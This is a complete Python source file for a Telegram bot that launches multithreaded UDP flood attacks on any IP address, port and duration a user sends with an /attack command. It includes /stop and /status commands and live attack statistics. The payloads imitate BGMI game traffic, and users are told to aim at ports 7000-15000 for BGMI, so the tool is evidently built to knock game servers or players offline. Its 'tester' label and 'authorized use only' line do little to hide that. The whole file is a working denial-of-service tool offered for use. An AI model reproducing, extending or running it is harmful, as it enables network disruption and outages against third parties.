#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
from telethon import TelegramClient, events, Button
from colorama import Fore, Style, init

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import config
from modules.utils import AttackUtils

init(autoreset=True)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

print(AttackUtils.get_banner())

# ============================================
# REAL UDP FLOOD CLASS
# ============================================
class RealUDPFlood:
    def __init__(self):
        self.is_running = False
        self.threads_list = []
        self.total_packets = 0
        self.total_bytes = 0
        self.total_connections = 0
        self.total_errors = 0
        self.start_time = 0
        self.lock = threading.Lock()
    
    def generate_bgmi_payload(self):
        """Generate BGMI-like UDP payload"""
        # Random size packet (like game traffic)
        size = random.randint(64, 1400)
        return random._urandom(size)
    
    def udp_worker(self, ip, port, duration):
        """Single UDP flood worker thread"""
        end_time = time.time() + duration
        
        try:
            # Create RAW UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Non-blocking
            sock.settimeout(0.1)
            
            while self.is_running and time.time() < end_time:
                try:
                    # Generate BGMI-like packet
                    payload = self.generate_bgmi_payload()
                    
                    # Send packet
                    bytes_sent = sock.sendto(payload, (ip, port))
                    
                    with self.lock:
                        self.total_packets += 1
                        self.total_bytes += bytes_sent
                        self.total_connections += 1
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    with self.lock:
                        self.total_errors += 1
                    continue
            
            sock.close()
            
        except Exception as e:
            with self.lock:
                self.total_errors += 1
    
    def start_attack(self, ip, port, threads, duration):
        """Start UDP flood attack"""
        self.is_running = True
        self.start_time = time.time()
        self.total_packets = 0
        self.total_bytes = 0
        self.total_connections = 0
        self.total_errors = 0
        self.threads_list = []
        
        # Start worker threads
        for i in range(threads):
            thread = threading.Thread(
                target=self.udp_worker,
                args=(ip, port, duration)
            )
            thread.daemon = True
            thread.start()
            self.threads_list.append(thread)
        
        # Wait for all threads or duration
        end_time = time.time() + duration
        while self.is_running and time.time() < end_time:
            time.sleep(0.1)
        
        self.is_running = False
        
        # Wait for threads to finish
        for thread in self.threads_list:
            thread.join(timeout=2)
        
        elapsed = time.time() - self.start_time
        
        # Calculate rates
        packet_rate = self.total_packets / elapsed if elapsed > 0 else 0
        conn_rate = self.total_connections / elapsed if elapsed > 0 else 0
        mbps = (self.total_bytes * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        
        return {
            'packets': self.total_packets,
            'bytes': self.total_bytes,
            'connections': self.total_connections,
            'errors': self.total_errors,
            'elapsed': elapsed,
            'packet_rate': packet_rate,
            'conn_rate': conn_rate,
            'mbps': mbps
        }
    
    def stop_attack(self):
        """Stop the attack"""
        self.is_running = False

# ============================================
# BOT SETUP
# ============================================
bot = TelegramClient(
    os.path.join(config.SESSION_DIR, 'bot'),
    config.API_ID,
    config.API_HASH
)

attacker = RealUDPFlood()
active_attack = False
attack_start_time = 0
current_target = {}

def is_authorized(user_id):
    return user_id in config.AUTHORIZED_USERS

# ============================================
# /attack COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/attack'))
async def attack_command(event):
    global active_attack, attack_start_time, current_target
    
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!**")
        return
    
    sender_id = event.sender_id
    
    # Check if already attacking
    if active_attack:
        elapsed = time.time() - attack_start_time
        remaining = current_target.get('time', 0) - elapsed
        await event.reply(
            f"⚠️ **ATTACK ALREADY RUNNING!**\n\n"
            f"🎯 Target: `{current_target['ip']}:{current_target['port']}`\n"
            f"⏱️ Elapsed: `{elapsed:.0f}s`\n"
            f"⏱️ Remaining: `{remaining:.0f}s`\n\n"
            f"🛑 Stop: `/stop`"
        )
        return
    
    parts = event.text.split()
    
    if len(parts) != 4:
        await event.reply(
            "⚠️ **Usage:** `/attack <ip> <port> <time>`\n\n"
            "**Example:** `/attack 192.168.1.1 8080 60`\n\n"
            "📋 **Parameters:**\n"
            "• IP: Target IP address\n"
            "• Port: Target port (1-65535)\n"
            "• Time: Duration in seconds\n\n"
            f"⏱️ Max time: {config.MAX_DURATION}s\n\n"
            "🔥 **For BGMI use port range: 7000-15000**"
        )
        return
    
    target_ip = parts[1]
    
    try:
        target_port = int(parts[2])
        if target_port < 1 or target_port > 65535:
            await event.reply("❌ Port must be 1-65535!")
            return
    except ValueError:
        await event.reply("❌ Port must be a number!")
        return
    
    try:
        attack_time = int(parts[3])
        if attack_time < 1:
            await event.reply("❌ Time must be at least 1 second!")
            return
        if attack_time > config.MAX_DURATION:
            await event.reply(f"❌ Max time is {config.MAX_DURATION}s!")
            return
    except ValueError:
        await event.reply("❌ Time must be a number!")
        return
    
    current_target = {
        'ip': target_ip,
        'port': target_port,
        'time': attack_time
    }
    
    # START ATTACK
    attack_start_time = time.time()
    active_attack = True
    
    start_msg = await event.reply(
        f"🔥 **ATTACK STARTED!** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target:** `{target_ip}:{target_port}`\n"
        f"⏱️ **Time:** `{attack_time}s`\n"
        f"🧵 **Threads:** `{config.MAX_THREADS}`\n"
        f"📡 **Type:** UDP Flood\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏳ Sending packets...\n"
        f"📤 UDP Flood active...\n\n"
        f"🛑 Stop: `/stop`\n"
        f"📊 Status: `/status`"
    )
    
    # Run attack in thread pool
    import concurrent.futures
    loop = asyncio.get_event_loop()
    
    try:
        with concurrent.futures.ThreadPoolExecutor() as pool:
            report = await loop.run_in_executor(
                pool,
                attacker.start_attack,
                target_ip,
                target_port,
                config.MAX_THREADS,
                attack_time
            )
        
        elapsed_str = AttackUtils.format_time(report['elapsed'])
        
        # SUCCESS REPORT
        result_msg = (
            f"✅ **ATTACK COMPLETED!** ✅\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **ATTACK REPORT**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 **Target:** `{target_ip}:{target_port}`\n"
            f"⏱️ **Duration:** `{elapsed_str}`\n"
            f"🧵 **Threads:** `{config.MAX_THREADS}`\n\n"
            f"📦 Packets Sent: `{report['packets']:,}`\n"
            f"📤 Data Sent: `{AttackUtils.format_bytes(report['bytes'])}`\n"
            f"🔗 Connections: `{report['connections']:,}`\n"
            f"⚡ Packet Rate: `{report['packet_rate']:.2f} pkt/s`\n"
            f"📶 Bandwidth: `{report['mbps']:.2f} Mbps`\n"
            f"❌ Errors: `{report['errors']}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **Status:** SUCCESS ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 New: `/attack IP PORT TIME`"
        )
        
        await start_msg.edit(result_msg)
        
    except Exception as e:
        elapsed = time.time() - attack_start_time
        
        error_msg = (
            f"❌ **ATTACK FAILED!** ❌\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏱️ Elapsed: `{elapsed:.0f}s`\n"
            f"🔴 Error: `{str(e)}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 **Check:**\n"
            f"• Target online?\n"
            f"• Port open?\n"
            f"• Running as root?\n"
            f"• Network stable?\n\n"
            f"🔄 Retry: `/attack {target_ip} {target_port} {attack_time}`"
        )
        
        await start_msg.edit(error_msg)
    
    finally:
        active_attack = False
        attack_start_time = 0
        current_target = {}

# ============================================
# /stop COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    global active_attack, attack_start_time, current_target
    
    if not is_authorized(event.sender_id):
        return
    
    if active_attack:
        elapsed = time.time() - attack_start_time
        
        attacker.stop_attack()
        active_attack = False
        
        await event.reply(
            f"⛔ **ATTACK STOPPED!** ⛔\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{current_target['ip']}:{current_target['port']}`\n"
            f"⏱️ Ran for: `{elapsed:.0f}s`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ Connections closed.\n"
            f"🔄 New: `/attack IP PORT TIME`"
        )
        
        attack_start_time = 0
        current_target = {}
    else:
        await event.reply(
            "💤 **No active attack!**\n\n"
            "Start: `/attack IP PORT TIME`"
        )

# ============================================
# /status COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/status'))
async def status_command(event):
    if not is_authorized(event.sender_id):
        return
    
    if active_attack:
        elapsed = time.time() - attack_start_time
        remaining = current_target['time'] - elapsed
        
        await event.reply(
            f"📊 **ATTACK STATUS** 📊\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 **RUNNING** 🔥\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 Target: `{current_target['ip']}:{current_target['port']}`\n"
            f"⏱️ Elapsed: `{elapsed:.0f}s`\n"
            f"⏱️ Remaining: `{remaining:.0f}s`\n"
            f"⏱️ Total: `{current_target['time']}s`\n\n"
            f"📦 Packets: `{attacker.total_packets:,}`\n"
            f"📤 Data: `{AttackUtils.format_bytes(attacker.total_bytes)}`\n\n"
            f"🛑 Stop: `/stop`"
        )
    else:
        await event.reply(
            "💤 **IDLE**\n\n"
            "Start: `/attack IP PORT TIME`"
        )

# ============================================
# /start COMMAND
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not is_authorized(event.sender_id):
        await event.reply("❌ **Access Denied!**")
        return
    
    await event.reply(
        f"🔥 **BGMI UDP FLOOD TESTER** 🔥\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚔️ **ATTACK COMMAND:**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"`/attack <ip> <port> <time>`\n\n"
        f"📋 **Example:**\n"
        f"`/attack 192.168.1.1 8080 60`\n\n"
        f"🎮 **For BGMI:**\n"
        f"Use port range: 7000-15000\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Commands:**\n"
        f"• `/attack IP PORT TIME`\n"
        f"• `/status` - Live stats\n"
        f"• `/stop` - Stop attack\n"
        f"• `/start` - Menu\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱️ Max: {config.MAX_DURATION}s\n"
        f"🧵 Threads: {config.MAX_THREADS}\n"
        f"⚠️ Root required!\n"
        f"⚠️ Authorized use only!"
    )

# ============================================
# MAIN
# ============================================
async def main():
    await bot.start(bot_token=config.BOT_TOKEN)
    
    print(f"{Fore.GREEN}[✓] BGMI UDP FLOOD BOT STARTED!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Command: /attack IP PORT TIME{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Threads: {config.MAX_THREADS} | Max Time: {config.MAX_DURATION}s{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] WARNING: Run as ROOT for maximum power!{Style.RESET_ALL}")
    print("-" * 50)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Bot stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
